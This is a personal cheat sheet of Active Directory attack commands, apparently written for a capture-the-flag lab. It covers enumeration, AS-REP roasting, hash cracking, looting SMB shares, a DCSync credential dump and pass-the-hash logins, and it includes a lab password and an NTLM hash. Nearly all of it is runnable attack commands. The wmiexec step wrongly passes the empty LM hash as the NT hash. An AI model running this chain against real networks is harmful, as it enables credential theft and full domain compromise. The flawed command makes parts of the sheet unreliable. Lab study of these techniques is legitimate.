# Kerberos-command
- to show port and version
    - `nmap -sV target IP`
    - `nmap -n -sCV target ip`
- What tool will allow us to enumerate port 139/445?
    - `enum4linux -u <username> -p <password> <target-ip>`
    - `enum4linux -n <target-ip> —-> to know domain name`
- to know valid user
    - `sudo ./kerbrute_linux_amd64 userenum -d <domain name> --dc <IP> /home/kali/userlist.txt`
- (AS-REP Roasting)To find accounts that have **pre-authentication disabled**, use **Impacket’s GetNPUsers.py**
    
    <aside>
    💡
    
    - python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <domain name/> -dc-ip 10.10.56.247 -usersfile /home/kali/userlist.txt -format hashcat -outputfile asrep_hashes.txt
    </aside>
    
- to get hash type
      - https://hashcat.net/wiki/doku.php?id=example_hashes
- crack hash and get password
    - `hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/dirb --force`
    - `john --format=krb5asrep --wordlist=/home/kali/passwordlist.txt asrep_hashes.txt`
- SMBclient (Manual Interaction) —→ We can now attempt to enumerate any shares that the domain controller may be giving out.
    - `smbclient -L //<target-ip> -U <username>`
- You can check its contents by connecting to it:
    - `smbclient [//10.10.231.4/backup](https://10.10.231.4/backup) -U svc-admin`
    - `ls`
    - `get filename.txt`
- Decoding the contents of the file
    - `base64 -d backup_credentials.txt`
- Elevating Privileges within the Domain
    - know the account on the active directory
        - `rpcclient -U user%password target-ip`
        - `enumdomusers`
        - when found `DS-Replication-Get-Changes-All`  `SeBackupPrivilege`
    - make DCSync attack to take all hash of password in NTDS.DIT:
    - `impacket-secretsdump -just-dc spookysec.local/backup:backup2517860@10.10.58.140`
    
    or 
    
    <aside>
    💡
    
    - python3 /usr/share/doc/python3-impacket/examples/secretsdump.py spookysec.local/backup:backupPassword@DC-IP
    </aside>
    
- make Pass-the-Hash attack to login by hash without crack hash and take password
- `evil-winrm -i 10.10.58.140 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc`
    
    <aside>
    💡
    
    - python3 /usr/share/doc/python3-impacket/examples/wmiexec.py spookysec.local/Administrator@10.10.58.140 -hashes :aad3b435b51404eeaad3b435b51404ee
    </aside>
    
-
